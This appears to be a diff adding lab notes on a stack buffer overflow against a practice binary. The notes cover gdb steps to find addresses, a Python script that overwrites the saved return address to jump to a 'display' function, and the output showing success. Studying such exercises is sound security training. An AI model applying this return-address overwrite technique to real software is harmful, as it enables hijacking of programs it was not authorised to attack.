@@ -1,0 +1,58 @@
+Step 1: Identify address of display
+1. gdb ex
+2. layout asm
+3. addr of main - 0x400a33
+4. addr of display - 0x4009bf
+5. quit
+
+
+Step 2: Identify address of buffer
+1. cat small
+   AAAA
+2. gdb ex
+3. break main
+4. break display
+5. run < small
+6. si
+7. info registers rbp rsp
+8. quit
+
+addr of strcpy in copy - 0x4009f1
+return address in copy - 0x4009f6
+start of buffer - 0x7fffffffe840
+rbp - 0x7fffffffe860 => 0x7fffffffe890
+rbp+1 - 0x7fffffffe868 => 0x400a30
+
+
+Step 3: Generate payload
+1. nano exploit.py
+   #!/usr/bin/python
+
+   import sys
+
+   # shellcode goes here
+   sc = 32 * 'A'
+
+   fake_rbp = 8 * 'B'
+
+   # The address of the shellcode
+   sc_addr = "\xbf\x09\x40\x00\x00\x00\x00\x00"
+
+   exp = sc + fake_rbp + sc_addr
+
+   sys.stdout.write(exp)
+
+2. ./exploit.py > payload
+3. cat payload 
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB?	@
+
+
+Step 4: exploit
+1. ./ex < payload 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Good job.
+Segmentation fault (core dumped)
